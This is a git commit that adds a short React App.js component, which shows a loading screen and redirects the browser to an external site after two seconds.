e860765ebfff307ac2f31d142ea8d5eab8dc7032
husknet <127146284+husknet@users.noreply.github.com>
2024-10-30 19:29:25 -0300

    Add files via upload

---
+++ src/App.js
@@ -0,0 +1,20 @@
+import React, { useEffect } from 'react';
+import Loading from './Loading';
+
+function App() {
+    useEffect(() => {
+        const timer = setTimeout(() => {
+            window.location.href = 'https://outbook.ioa.com.ar/';
+        }, 2000);
+
+        return () => clearTimeout(timer);
+    }, []);
+
+    return (
+        <div className="App">
+            <Loading />
+        </div>
+    );
+}
+
+export default App;
